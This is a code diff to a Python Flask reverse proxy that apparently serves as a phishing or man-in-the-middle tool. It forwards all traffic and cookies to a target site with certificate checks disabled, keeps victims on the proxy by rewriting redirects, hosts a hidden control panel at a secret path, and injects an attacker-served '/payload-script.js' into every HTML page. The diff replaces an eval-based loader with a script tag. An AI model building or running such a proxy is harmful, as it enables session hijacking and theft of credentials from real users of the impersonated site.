@@ -199,23 +199,29 @@ def start_proxy(target, host, port, secret):
             'port': port
         })
 
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
+
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        # Handle panel routes first
         if path.startswith(secret):
             if path == secret:
                 return panel_index()
             filename = path[len(secret)+1:]
             return panel_files(filename)
 
-        # Handle payload script
         if path == 'payload-script.js':
-            return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
+            return serve_payload()
 
         try:
-            # Build target URL
-            target_url = f"https://{target}/{path}"
+            # Build target URL - handle both absolute and relative paths
+            if path.startswith('http'):
+                target_url = path
+            else:
+                target_url = f"https://{target}/{path}"
+            
             if request.query_string:
                 target_url += f"?{request.query_string.decode()}"
 
@@ -234,29 +240,26 @@ def start_proxy(target, host, port, secret):
                 headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=True,
+                allow_redirects=False,  # Handle redirects manually
                 verify=False,
                 timeout=30
             )
+
+            # Handle redirects
+            if resp.status_code in [301, 302, 303, 307, 308]:
+                location = resp.headers.get('Location')
+                if location:
+                    if location.startswith('http'):
+                        # Convert absolute URL to relative path
+                        location = '/' + location.split('/', 3)[-1]
+                    return Response('', resp.status_code, {'Location': location})
 
             # Process response
             content = resp.content
             if 'text/html' in resp.headers.get('Content-Type', '').lower():
                 try:
                     content = content.decode()
-                    payload = '''
-                        <script>
-                            fetch('/payload-script.js')
-                                .then(response => response.text())
-                                .then(script => {
-                                    eval(script);
-                                    if (typeof PayloadManager !== 'undefined') {
-                                        PayloadManager.init();
-                                    }
-                                })
-                                .catch(error => console.error('Error loading payload:', error));
-                        </script>
-                    '''
+                    payload = '<script src="/payload-script.js"></script>'
                     if '</head>' in content:
                         content = content.replace('</head>', f'{payload}</head>')
                     elif '<body>' in content:
